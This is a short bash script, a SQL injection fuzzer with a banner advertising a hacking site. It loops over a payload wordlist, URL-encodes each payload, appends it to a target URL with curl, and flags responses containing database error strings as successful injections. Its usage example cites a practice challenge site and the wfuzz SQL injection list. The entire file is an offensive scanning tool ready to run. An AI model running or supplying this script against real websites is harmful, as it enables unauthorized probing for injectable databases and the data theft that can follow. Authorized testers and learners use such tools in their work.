#!/bin/bash
clear
echo "           _          _         _     ______                        "
echo "    /\    | |        | |       | |   |____  |                       "
echo "   /  \   | |__    __| | _   _ | | _ __  / /_ __ ___    __ _  _ __  "
echo "  / /\ \  | '_ \  / _  || | | || || '__|/ /| '_   _ \  / _  || '_ \ "
echo " / ____ \ | |_) || (_| || |_| || || |  / / | | | | | || (_| || | | |"
echo "/_/    \_\|_.__/  \__,_| \__,_||_||_| /_/  |_| |_| |_| \__,_||_| |_|"
echo "                               \|||/"
echo "                               (o o)"
echo "         .-.____        +-oooO--(_)---------+       ________.-."
echo "----/ \_)_______)       |   Visit Us At     |      (_______(_/ \----"
echo "   (    ()___)          https://hackerenv.com         (___()    )"
echo "        ()__)           |                   |          (__()"
echo "----\___()_)            +------------Ooo----+             (_()___/----"
echo "                               |__|__|"
echo "                                || ||"
echo "                               ooO Ooo"

url="${1}"
list="${2}"
urlEncode() {
	while read -n 1 i
	do
		if [[ "${i}" = "'" ]]
		then
			char="${payload}"
			encode="%27"
			payload="${char/\'/$encode}"
		elif [[ "${i}" = '"' ]]
		then
			char="${payload}"
			encode="%22"
			payload="${char/\"/$encode}"
		elif [[ "${i}" = ' ' ]]
		then
			char="${payload}"
			encode="%20"
			payload="${char/ /$encode}"
		fi
	done <<< "${payload}"
}

if [[ ! -z "${url}" && "${list}" ]]
then

	for payload in $(cat "${list}")
	do
		urlEncode "${payload}"
		curl -s "${url}""${payload}" |  isError="$(grep -e 'error' -e 'mysql_fetch_array()')" && echo -e "\e[32mSuccessful Payload\e[0m: ${url}\e[31m${payload}\e[0m"
	done
else
	echo -e "Usage:\n./sqliFuzzer.sh URL payload.txt\n./sqlfuzzer.sh http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1 /usr/share/wfuzz/wordlist/Injections/SQL.txt"
fi
